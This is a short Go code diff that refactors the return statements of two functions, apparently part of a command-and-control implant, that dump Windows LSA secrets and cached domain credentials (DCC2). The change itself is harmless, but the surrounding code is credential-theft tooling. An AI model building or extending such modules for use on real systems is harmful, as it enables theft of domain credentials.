@@ -158,11 +158,7 @@ func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
 
 	sb.WriteString(fmt.Sprintf("Decrypted: %d/%d secrets\n", decrypted, len(subkeys)))
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // lsaDumpCachedCreds extracts cached domain credentials (DCC2 / MSCacheV2)
@@ -238,9 +234,5 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 	}
 
 	// Credentials are registered via ProcessResponse hook (server-side)
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
